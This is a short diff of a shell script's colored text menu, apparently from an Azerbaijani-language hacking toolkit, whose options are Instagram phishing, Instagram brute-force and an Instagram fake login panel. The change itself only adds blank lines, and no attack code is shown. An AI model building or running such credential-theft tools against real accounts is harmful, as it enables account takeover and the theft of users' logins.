@@ -20,6 +20,8 @@ echo -e '\033[32;40;1m
 echo -e "\033[31;40;1m
 \033[31;40;1m[01]\e[37mİnstagram Phishing          \033[31;40;1m[02]\e[37mİnstagram Brute-Force
 \033[31;40;1m[03]\e[37mİnstagram Fake Panel
+
+
 \e[31m[00]\e[37m Menyu
 \e[31m[99]\e[37m Çıxış
 "
